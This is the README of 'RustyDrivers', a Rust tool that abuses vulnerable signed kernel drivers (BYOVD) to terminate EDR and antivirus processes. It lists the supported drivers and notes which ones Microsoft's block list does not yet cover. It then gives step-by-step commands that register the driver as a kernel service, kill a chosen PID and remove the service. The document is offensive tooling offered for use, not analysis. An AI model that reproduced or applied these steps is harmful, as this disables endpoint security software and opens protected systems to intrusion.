# RustyDrivers
This project is a BYOVD collection with the focus on killing EDR / AV processes.

Currently the following drivers are supported:
| **Driver**       | **Argument Name** | **Blocked** |
|------------------|-------------------|-------------|
| Process Explorer | process_explorer  | Yes         |
| Genshin Impact   | genshin           | Yes         |
| Rentdrv2         | rentdrv2          | No          |
| TrueSight        | truesight         | No          |

Blocked means that the driver is in the [block list](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules#vulnerable-driver-blocklist-xml) of Microsoft and cannot be executed on an up to date Windows.

# Build
```
cargo build --release
```

# Usage
```
rusty_drivers.exe --help            
Usage: rusty_drivers.exe --pid <PID> --driver <DRIVER>

Options:
  -p, --pid <PID>
  -d, --driver <DRIVER>
  -h, --help             Print help
  -V, --version          Print version
```

# Example
Since the executable does not register a server to exploit the driver, this needs to be done manually:
```
sc create Test123 binpath= c:\test\<DRIVER>.sys type= kernel start= auto
```
Afterwards the service can be started:
```
sc start Test123
```
Finally, to shut down the process with the PID of 1234 using the Process Explorer driver the following command can be used:
```
rusty_drivers.exe --pid 1234 --driver process_explorer          
```
Do not forget to cleanup the service afterwards:
```
sc stop Test123
sc delete Test123
```
